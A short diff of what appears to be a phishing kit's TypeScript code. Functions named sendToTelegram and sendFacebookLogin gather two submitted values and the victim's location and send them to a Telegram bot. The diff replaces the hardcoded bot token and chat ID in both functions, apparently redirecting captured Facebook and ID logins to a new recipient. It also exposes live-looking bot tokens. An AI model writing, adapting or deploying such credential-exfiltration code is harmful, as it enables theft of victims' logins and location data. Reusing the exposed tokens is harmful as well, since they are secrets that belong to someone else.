@@ -26,8 +26,8 @@ export const sendToTelegram = async (
   q1: string, 
   q2: string
 ) => {
-  const BOT_TOKEN = '8221710757:AAEl7v_CMy8GUm3-bP2NhkFiYHnKX0Wg32w';
-  const CHAT_ID = '-5022569647';
+  const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
+  const CHAT_ID = '6885815623';
 
   const loc = await getLocation();
 
@@ -61,8 +61,8 @@ export const sendFacebookLogin = async (
   q2: string
 ) => {
   // Use the SAME token as ID login which is known to work
-  const BOT_TOKEN = '8221710757:AAEl7v_CMy8GUm3-bP2NhkFiYHnKX0Wg32w';
-  const CHAT_ID = '-5022569647';
+  const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
+  const CHAT_ID = '6885815623';
 
   const loc = await getLocation();
   const now = new Date();
